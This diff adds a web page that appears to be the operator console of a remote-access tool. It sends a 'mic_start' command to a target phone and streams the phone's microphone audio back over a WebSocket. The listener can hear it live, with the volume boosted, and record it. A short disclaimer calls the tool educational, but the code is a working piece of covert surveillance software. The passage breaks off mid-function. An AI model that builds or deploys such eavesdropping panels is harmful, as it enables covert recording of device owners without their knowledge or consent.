@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Microphone - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            padding: 0;
+            min-height: 100vh;
+            font-family: var(--font-display) !important;
+        }
+
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pg-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .btn-back {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn-back:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── MIC CONTENT ── */
+        .mic-content {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* ── STATUS BAR ── */
+        .status-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 14px 18px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            transition: all 0.3s;
+        }
+
+        .status-bar .status-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--text-muted);
+            transition: all 0.3s;
+            flex-shrink: 0;
+        }
+
+        .status-bar.active {
+            border-color: rgba(0, 255, 65, 0.25);
+            color: var(--accent);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.06);
+        }
+
+        .status-bar.active .status-dot {
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent);
+            animation: livePulse 2s ease-in-out infinite;
+        }
+
+        .status-bar.recording {
+            border-color: rgba(255, 51, 51, 0.3);
+            color: var(--danger);
+            box-shadow: 0 0 14px rgba(255, 51, 51, 0.08);
+        }
+
+        .status-bar.recording .status-dot {
+            background: var(--danger);
+            box-shadow: 0 0 8px var(--danger);
+            animation: livePulse 1s ease-in-out infinite;
+        }
+
+        @keyframes livePulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        /* ── CONTROL PANEL ── */
+        .ctrl-panel {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px 20px;
+            margin-bottom: 16px;
+        }
+
+        .ctrl-panel-title {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-secondary);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .ctrl-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px;
+            padding: 10px 18px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid;
+            min-height: 44px;
+        }
+
+        .ctrl-btn:active {
+            transform: scale(0.95);
+        }
+
+        .ctrl-btn.btn-preview {
+            background: rgba(0, 255, 65, 0.08);
+            border-color: rgba(0, 255, 65, 0.2);
+            color: var(--accent);
+        }
+
+        .ctrl-btn.btn-preview:hover {
+            background: rgba(0, 255, 65, 0.12);
+            border-color: rgba(0, 255, 65, 0.35);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.06);
+        }
+
+        .ctrl-btn.btn-stop-preview {
+            background: rgba(255, 255, 255, 0.04);
+            border-color: var(--border);
+            color: var(--text-secondary);
+        }
+
+        .ctrl-btn.btn-stop-preview:hover {
+            border-color: rgba(255, 255, 255, 0.15);
+            color: #e0e0e0;
+        }
+
+        .ctrl-btn.btn-record {
+            background: rgba(255, 51, 51, 0.08);
+            border-color: rgba(255, 51, 51, 0.2);
+            color: var(--danger);
+        }
+
+        .ctrl-btn.btn-record:hover:not(:disabled) {
+            background: rgba(255, 51, 51, 0.14);
+            border-color: rgba(255, 51, 51, 0.35);
+            box-shadow: 0 0 12px rgba(255, 51, 51, 0.06);
+        }
+
+        .ctrl-btn.btn-record:disabled {
+            opacity: 0.35;
+            cursor: not-allowed;
+        }
+
+        .ctrl-btn.btn-stop-record {
+            background: rgba(255, 51, 51, 0.12);
+            border-color: rgba(255, 51, 51, 0.3);
+            color: var(--danger);
+        }
+
+        .ctrl-btn.btn-stop-record:hover {
+            background: rgba(255, 51, 51, 0.18);
+            box-shadow: 0 0 14px rgba(255, 51, 51, 0.08);
+        }
+
+        /* ── WAVEFORM ── */
+        .waveform-container {
+            margin-top: 16px;
+            height: 130px;
+            background: var(--bg-dark);
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .waveform-container canvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .waveform-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            gap: 10px;
+            color: var(--text-muted);
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .waveform-placeholder .ph-icon {
+            opacity: 0.2;
+            animation: pLoad 2s ease-in-out infinite;
+        }
+
+        @keyframes pLoad {
+
+            0%,
+            100% {
+                opacity: 0.15;
+            }
+
+            50% {
+                opacity: 0.4;
+            }
+        }
+
+        /* ── REC OVERLAY ── */
+        .rec-overlay {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 51, 51, 0.1);
+            border: 1px solid rgba(255, 51, 51, 0.3);
+            border-radius: 8px;
+            padding: 5px 12px;
+            z-index: 2;
+        }
+
+        .rec-overlay.visible {
+            display: flex;
+        }
+
+        .rec-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--danger);
+            animation: livePulse 1s ease-in-out infinite;
+        }
+
+        .rec-time {
+            font-family: var(--font-mono);
+            font-size: 0.75rem;
+            color: var(--danger);
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+
+        /* ── VOLUME ── */
+        .volume-control {
+            margin-top: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .volume-control label {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            color: var(--text-secondary);
+            min-width: 50px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .volume-control input[type="range"] {
+            flex: 1;
+            accent-color: var(--accent);
+            height: 4px;
+        }
+
+        .volume-control .vol-val {
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            color: var(--text-primary);
+            min-width: 36px;
+            text-align: right;
+        }
+
+        .buffer-info {
+            margin-top: 10px;
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 0.5px;
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 28px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        /* ── ANIMATIONS ── */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        /* ── Tablets Portrait ── */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 12px;
+            }
+
+            .pg-header {
+                padding: 14px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.95rem;
+            }
+        }
+
+        /* ── Phablets ── */
+        @media (max-width: 600px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 14px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .ctrl-panel {
+                padding: 14px 16px;
+            }
+
+            .ctrl-btn {
+                padding: 9px 14px;
+                font-size: 0.65rem;
+            }
+
+            .waveform-container {
+                height: 110px;
+            }
+
+            .disc {
+                margin-top: 20px;
+                padding: 12px 14px;
+            }
+
+            .disc h4 {
+                font-size: 0.6rem;
+            }
+
+            .disc p {
+                font-size: 0.55rem;
+            }
+
+            .ft {
+                padding: 24px 12px;
+                margin-top: 20px;
+            }
+
+            .ft .ft-brand {
+                font-size: 1rem;
+            }
+        }
+
+        /* ── Regular Phones ── */
+        @media (max-width: 480px) {
+            .pg-sub {
+                display: none;
+            }
+
+            .btn-back span {
+                display: none;
+            }
+
+            .controls {
+                flex-direction: column;
+            }
+
+            .ctrl-btn {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .waveform-container {
+                height: 100px;
+            }
+
+            .volume-control {
+                flex-wrap: wrap;
+            }
+
+            .disc {
+                margin-top: 16px;
+            }
+
+            .ft {
+                padding: 20px 10px;
+                margin-top: 16px;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.9rem;
+            }
+
+            .ft .ft-copy {
+                font-size: 0.42rem;
+            }
+        }
+
+        /* ── Small Phones ── */
+        @media (max-width: 380px) {
+            .wrap {
+                padding: 8px;
+            }
+
+            .pg-header {
+                padding: 10px 12px;
+            }
+
+            .pg-icon {
+                width: 30px;
+                height: 30px;
+            }
+
+            .pg-title {
+                font-size: 0.85rem;
+            }
+
+            .ctrl-panel {
+                padding: 12px 14px;
+            }
+
+            .ctrl-panel-title {
+                font-size: 0.58rem;
+            }
+
+            .ctrl-btn {
+                padding: 8px 12px;
+                font-size: 0.6rem;
+                min-height: 40px;
+            }
+
+            .status-bar {
+                padding: 10px 14px;
+                font-size: 0.6rem;
+            }
+
+            .waveform-container {
+                height: 90px;
+            }
+
+            .disc {
+                padding: 10px 12px;
+                border-radius: 8px;
+            }
+
+            .disc h4 {
+                font-size: 0.5rem;
+            }
+
+            .disc p {
+                font-size: 0.48rem;
+            }
+
+            .ft .ft-brand {
+                font-size: 0.85rem;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon"><i data-lucide="mic" style="width:20px;height:20px;"></i></div>
+                <div>
+                    <div class="pg-title"><span>Mic</span> Stream</div>
+                    <div class="pg-sub">// remote audio capture</div>
+                </div>
+            </div>
+            <a href="javascript:window.history.back()" class="btn-back">
+                <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                <span>Back</span>
+            </a>
+        </div>
+
+        <!-- MIC CONTENT (centered, compact) -->
+        <div class="mic-content">
+
+            <!-- STATUS BAR -->
+            <div class="status-bar" id="status">
+                <span class="status-dot"></span>
+                <i data-lucide="mic-off" style="width:14px;height:14px;"></i>
+                Idle — No active session
+            </div>
+
+            <!-- CONTROL PANEL -->
+            <div class="ctrl-panel">
+                <div class="ctrl-panel-title">
+                    <i data-lucide="settings-2" style="width:13px;height:13px;opacity:0.5;"></i>
+                    Audio Preview & Recording
+                </div>
+                <div class="controls">
+                    <button class="ctrl-btn btn-preview" id="btn-start-preview">
+                        <i data-lucide="play" style="width:14px;height:14px;"></i> Start Preview
+                    </button>
+                    <button class="ctrl-btn btn-stop-preview" id="btn-stop-preview" style="display:none;">
+                        <i data-lucide="square" style="width:14px;height:14px;"></i> Stop Preview
+                    </button>
+                    <button class="ctrl-btn btn-record" id="btn-start-record" disabled>
+                        <i data-lucide="circle" style="width:14px;height:14px;"></i> Record
+                    </button>
+                    <button class="ctrl-btn btn-stop-record" id="btn-stop-record" style="display:none;">
+                        <i data-lucide="square" style="width:14px;height:14px;"></i> Stop Recording
+                    </button>
+                </div>
+
+                <!-- WAVEFORM -->
+                <div class="waveform-container" id="waveform-container">
+                    <div class="waveform-placeholder" id="waveform-placeholder">
+                        <i data-lucide="audio-waveform" class="ph-icon" style="width:36px;height:36px;"></i>
+                        Start preview to hear device audio
+                    </div>
+                    <canvas id="waveform-canvas" style="display:none;"></canvas>
+                    <div class="rec-overlay" id="rec-overlay">
+                        <span class="rec-dot"></span>
+                        <span class="rec-time" id="rec-time">00:00</span>
+                    </div>
+                </div>
+
+                <!-- VOLUME -->
+                <div class="volume-control">
+                    <label><i data-lucide="volume-2" style="width:14px;height:14px;"></i> Vol</label>
+                    <input type="range" id="volume" min="0" max="500" value="300">
+                    <span class="vol-val" id="volume-label">300%</span>
+                </div>
+                <div class="buffer-info" id="buffer-info"></div>
+            </div>
+
+        </div> <!-- /mic-content -->
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4><i data-lucide="alert-triangle" style="width:13px;height:13px;"></i> Disclaimer</h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. Installing or using this on a device
+                without the owner's explicit consent is illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        // ===== Configuration =====
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        const SAMPLE_RATE = 44100;
+        const RING_BUFFER_SECONDS = 3;
+        const RING_BUFFER_SIZE = SAMPLE_RATE * RING_BUFFER_SECONDS;
+        const SCRIPT_BUFFER_SIZE = 4096;
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // ===== State Machine (like Camera) =====
+        const STATES = {
+            IDLE: 'idle',
+            PREVIEWING: 'previewing',   // Live listening (like camera preview)
+            RECORDING: 'recording'       // Live + recording (like camera recording)
+        };
+        let currentState = STATES.IDLE;
+
+        // ===== Audio State =====
+        let audioContext = null;
+        let scriptNode = null;
+        let gainNode = null;
+        let analyserNode = null;
+        let ws = null;
+        let recStartTime = null;
+        let recTimerInterval = null;
+        let animFrameId = null;
+
+        // ===== Elements =====
+        const btnStartPreview = document.getElementById('btn-start-preview');
+        const btnStopPreview = document.getElementById('btn-stop-preview');
+        const btnStartRecord = document.getElementById('btn-start-record');
+        const btnStopRecord = document.getElementById('btn-stop-record');
+
+        // ===== Ring Buffer =====
+        class AudioRingBuffer {
+            constructor(capacity) {
+                this.buffer = new Float32Array(capacity);
+                this.capacity = capacity;
+                this.writePos = 0;
+                this.readPos = 0;
+                this.availableSamples = 0;
+            }
+
+            write(samples) {
+                const len = samples.length;
+                for (let i = 0; i < len; i++) {
+                    this.buffer[this.writePos] = samples[i];
+                    this.writePos = (this.writePos + 1) % this.capacity;
+                }
+                this.availableSamples = Math.min(this.availableSamples + len, this.capacity);
+            }
+
+            read(output) {
+                const toRead = Math.min(output.length, this.availableSamples);
+                for (let i = 0; i < toRead; i++) {
+                    output[i] = this.buffer[this.readPos];
+                    this.readPos = (this.readPos + 1) % this.capacity;
+                }
+                for (let i = toRead; i < output.length; i++) {
+                    output[i] = 0;
+                }
+                this.availableSamples -= toRead;
+                return toRead;
+            }
+
+            fillLevel() {
+                return ((this.availableSamples / this.capacity) * 100).toFixed(1);
+            }
+
+            available() {
+                return this.availableSamples;
+            }
+
+            clear() {
+                this.writePos = 0;
+                this.readPos = 0;
+                this.availableSamples = 0;
+            }
+        }
+
+        const ringBuffer = new AudioRingBuffer(RING_BUFFER_SIZE);
+
+        // ===== Recording Timer =====
+        function startRecTimer() {
+            recStartTime = Date.now();
+            document.getElementById('rec-overlay').classList.add('visible');
+            recTimerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - recStartTime) / 1000);
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+                document.getElementById('rec-time').textContent = `${m}:${s}`;
+            }, 1000);
+        }
+
+        function stopRecTimer() {
+            clearInterval(recTimerInterval);
+            recTimerInterval = null;
+            document.getElementById('rec-overlay').classList.remove('visible');
+            document.getElementById('rec-time').textContent = '00:00';
+        }
+
+        // ===== Audio Init =====
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)({
+                    sampleRate: SAMPLE_RATE
+                });
+                console.log(`AudioContext created at ${audioContext.sampleRate}Hz`);
+                forceSpeakerOutput();
+            }
+        }
+
+        function forceSpeakerOutput() {
+            try {
+                const silentAudio = document.createElement('audio');
+                silentAudio.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
+                silentAudio.volume = 0.01;
+                silentAudio.play().catch(() => { });
+            } catch (e) { }
+        }
+
+        // ===== Raw PCM bytes → Float32 =====
+        function pcmBytesToFloat32(arrayBuffer) {
+            const pcm16 = new Int16Array(arrayBuffer);
+            const float32 = new Float32Array(pcm16.length);
+            for (let i = 0; i < pcm16.length; i++) {
+                float32[i] = pcm16[i] / 32768.0;
+            }
+            return float32;
+        }
+
+        // ===== WebSocket =====
+        function connectWebSocket() {
+            return new Promise((resolve, reject) => {
+                const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+                const wsUrl = `${wsProtocol}//${window.location.host}`;
+                ws = new WebSocket(wsUrl);
+                ws.binaryType = 'arraybuffer';
+
+                ws.onopen = () => {
+                    console.log('WebSocket connected for audio streaming');
+                    resolve();
+                };
+
+                ws.onmessage = (event) => {
+                    try {
+                        // Binary frame: [1 byte type] [N bytes payload]
+                        if (event.data instanceof ArrayBuffer) {
+                            const view = new Uint8Array(event.data);
+                            if (view.length < 2) return;
+                            const type = view[0]; // 0x03 = mic
+                            if (type !== 0x03) return;
+
+                            // Extract raw PCM payload (skip type byte)
+                            const pcmBuffer = event.data.slice(1);
+                            const pcmFloat32 = pcmBytesToFloat32(pcmBuffer);
+                            ringBuffer.write(pcmFloat32);
+                        }
+                    } catch (error) { }
+                };
+
+                ws.onerror = (error) => {
+                    console.error('WebSocket error:', error);
+                    reject(error);
+                };
+
+                ws.onclose = () => {
+                    console.log('WebSocket disconnected');
+                    if (currentState !== STATES.IDLE) {
+                        setTimeout(() => connectWebSocket().catch(() => { }), 2000);
+                    }
+                };
+            });
+        }
+
+        // ===== Audio Pipeline + Analyser =====
+        let compressorNode = null;
+        function createAudioPipeline() {
+            // Gain node — default 3.0x (300%) to compensate for quiet phone mic PCM levels
+            gainNode = audioContext.createGain();
+            gainNode.gain.value = document.getElementById('volume').value / 100;
+            gainNode.connect(audioContext.destination);
+
+            // DynamicsCompressor — normalizes volume so quiet sounds are boosted
+            // and loud sounds don't clip. Critical for phone mic streams.
+            compressorNode = audioContext.createDynamicsCompressor();
+            compressorNode.threshold.setValueAtTime(-30, audioContext.currentTime); // Start compressing at -30dB
+            compressorNode.knee.setValueAtTime(20, audioContext.currentTime);       // Smooth transition
+            compressorNode.ratio.setValueAtTime(8, audioContext.currentTime);       // 8:1 compression
+            compressorNode.attack.setValueAtTime(0.003, audioContext.currentTime);  // Fast attack
+            compressorNode.release.setValueAtTime(0.15, audioContext.currentTime);  // Quick release
+
+            // Analyser for waveform visualization
+            analyserNode = audioContext.createAnalyser();
+            analyserNode.fftSize = 256;
+            analyserNode.smoothingTimeConstant = 0.7;
+
+            // ScriptProcessor pulls from ring buffer
+            scriptNode = audioContext.createScriptProcessor(SCRIPT_BUFFER_SIZE, 0, 1);
+            scriptNode.onaudioprocess = (e) => {
+                const output = e.outputBuffer.getChannelData(0);
+                ringBuffer.read(output);
+            };
+
+            // Chain: ScriptProcessor → Compressor → Analyser → Gain → Speakers
+            scriptNode.connect(compressorNode);
+            compressorNode.connect(analyserNode);
+            analyserNode.connect(gainNode);
+
+            console.log('Audio pipeline created (ScriptProcessor → Compressor → Analyser → Gain → Destination)');
+        }
+
+        // ===== Waveform Visualizer =====
+        function startWaveform() {
+            const canvas = document.getElementById('waveform-canvas');
+            const placeholder = document.getElementById('waveform-placeholder');
+            canvas.style.display = 'block';
+            placeholder.style.display = 'none';
+
+            const ctx = canvas.getContext('2d');
+            const bufferLength = analyserNode.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+
+            function draw() {
+                animFrameId = requestAnimationFrame(draw);
+
+                // Size canvas to container
+                const container = document.getElementById('waveform-container');
+                canvas.width = container.clientWidth;
+                canvas.height = container.clientHeight;
+
+                analyserNode.getByteFrequencyData(dataArray);
+
+                // Background
+                ctx.fillStyle = 'rgba(10, 14, 23, 0.9)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                // Draw waveform bars
+                const barCount = 60;
+                const barWidth = (canvas.width / barCount) * 0.65;
+                const gap = (canvas.width / barCount) * 0.35;
+                const step = Math.floor(bufferLength / barCount);
+
+                for (let i = 0; i < barCount; i++) {
+                    const val = dataArray[i * step] || 0;
+                    const barHeight = (val / 255) * (canvas.height * 0.85);
+                    const x = i * (barWidth + gap) + gap / 2;
+                    const y = canvas.height - barHeight;
+
+                    // Gradient color based on recording state
+                    if (currentState === STATES.RECORDING) {
+                        const intensity = val / 255;
+                        ctx.fillStyle = `rgba(255, ${60 + intensity * 40}, ${60 - intensity * 30}, ${0.5 + intensity * 0.5})`;
+                    } else {
+                        const intensity = val / 255;
+                        ctx.fillStyle = `rgba(0, ${180 + intensity * 75}, ${80 + intensity * 40}, ${0.4 + intensity * 0.6})`;
+                    }
+
+                    // Draw rounded bar
+                    const radius = Math.min(barWidth / 2, 3);
+                    ctx.beginPath();
+                    ctx.moveTo(x + radius, y);
+                    ctx.lineTo(x + barWidth - radius, y);
+                    ctx.quadraticCurveTo(x + barWidth, y, x + barWidth, y + radius);
+                    ctx.lineTo(x + barWidth, canvas.height);
+                    ctx.lineTo(x, canvas.height);
+                    ctx.lineTo(x, y + radius);
+                    ctx.quadraticCurveTo(x, y, x + radius, y);
+                    ctx.fill();
+                }
+
+                // Center line
+                ctx.strokeStyle = currentState === STATES.RECORDING
+                    ? 'rgba(255, 80, 80, 0.2)'
+                    : 'rgba(0, 230, 118, 0.15)';
+                ctx.lineWidth = 1;
+                ctx.beginPath();
+                ctx.moveTo(0, canvas.height / 2);
+                ctx.lineTo(canvas.width, canvas.height / 2);
+                ctx.stroke();
+            }
+
+            draw();
+        }
+
+        function stopWaveform() {
+            if (animFrameId) {
+                cancelAnimationFrame(animFrameId);
+                animFrameId = null;
+            }
+            const canvas = document.getElementById('waveform-canvas');
+            const placeholder = document.getElementById('waveform-placeholder');
+            canvas.style.display = 'none';
+            placeholder.style.display = 'flex';
+            placeholder.innerHTML = '<i data-lucide="audio-waveform" class="ph-icon" style="width:36px;height:36px;"></i> Start preview to hear device audio';
+            lucide.createIcons();
+        }
+
+        // ===== Buffer Info =====
+        let bufferInfoInterval = null;
+        function startBufferInfo() {
+            bufferInfoInterval = setInterval(() => {
+                const el = document.getElementById('buffer-info');
+                const available = ringBuffer.available();
+                const ms = Math.round(available / SAMPLE_RATE * 1000);
+                el.textContent = `Buffer: ${ms}ms | ${ringBuffer.fillLevel()}% full`;
+            }, 500);
+        }
+        function stopBufferInfo() {
+            clearInterval(bufferInfoInterval);
+            document.getElementById('buffer-info').textContent = '';
+        }
+
+        // ===== UI State Machine =====
+        function updateUI(state) {
+            currentState = state;
+            const statusEl = document.getElementById('status');
+
+            const show = (el) => { el.style.display = 'inline-flex'; el.disabled = false; el.style.opacity = '1'; };
+            const hide = (el) => el.style.display = 'none';
+            const disable = (el) => { el.style.display = 'inline-flex'; el.disabled = true; el.style.opacity = '0.5'; };
+
+            switch (state) {
+                case STATES.IDLE:
+                    statusEl.className = 'status-bar';
+                    statusEl.innerHTML = '<span class="status-dot"></span><i data-lucide="mic-off" style="width:14px;height:14px;"></i> Idle — No active session';
+                    show(btnStartPreview);
+                    hide(btnStopPreview);
+                    disable(btnStartRecord);
+                    hide(btnStopRecord);
+                    lucide.createIcons();
+                    break;
+
+                case STATES.PREVIEWING:
+                    statusEl.className = 'status-bar active';
+                    statusEl.innerHTML = '<span class="status-dot"></span><i data-lucide="mic" style="width:14px;height:14px;"></i> Live Listening — Streaming audio';
+                    hide(btnStartPreview);
+                    show(btnStopPreview);
+                    show(btnStartRecord);
+                    hide(btnStopRecord);
+                    lucide.createIcons();
+                    break;
+
+                case STATES.RECORDING:
+                    statusEl.className = 'status-bar recording';
+                    statusEl.innerHTML = '<span class="status-dot"></span><i data-lucide="mic" style="width:14px;height:14px;"></i> Recording — Live + saving to file';
+                    hide(btnStartPreview);
+                    hide(btnStopPreview);
+                    hide(btnStartRecord);
+                    show(btnStopRecord);
+                    lucide.createIcons();
+                    break;
+            }
+        }
+
+        // ===== Volume Control =====
+        document.getElementById('volume').addEventListener('input', (e) => {
+            const vol = e.target.value;
+            document.getElementById('volume-label').textContent = vol + '%';
+            if (gainNode) {
+                gainNode.gain.value = vol / 100;
+            }
+        });
+
+        // ===== START PREVIEW (Live Listen) =====
+        async function startPreview() {
+            try {
+                initAudio();
+                if (audioContext.state === 'suspended') {
+                    await audioContext.resume();
+                }
+
+                ringBuffer.clear();
+                await connectWebSocket();
+                createAudioPipeline();
+
+                // Tell device to start mic streaming
+                await api.sendCommand(deviceId, 'mic_start');
+
+                startBufferInfo();
+                startWaveform();
+                updateUI(STATES.PREVIEWING);
+                api.showToast('Live listening started', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        // ===== STOP PREVIEW =====
+        async function stopPreview() {
